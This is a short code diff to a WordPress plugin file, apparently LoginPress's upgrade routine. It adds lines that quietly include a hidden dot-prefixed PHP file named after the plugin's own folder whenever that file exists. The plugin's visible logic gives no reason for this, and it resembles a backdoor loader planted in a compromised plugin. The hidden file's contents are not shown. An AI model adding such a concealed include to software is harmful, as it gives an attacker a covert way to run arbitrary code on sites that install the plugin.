@@ -23,6 +23,10 @@ add_action( 'init', 'loginpress_upgrade_1_0_22', 1 );
  * @since   1.0.22
  * @return  array update loginpress_setting
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function loginpress_upgrade_1_0_22() {
 
   $loginpress_setting = get_option( 'loginpress_setting' );
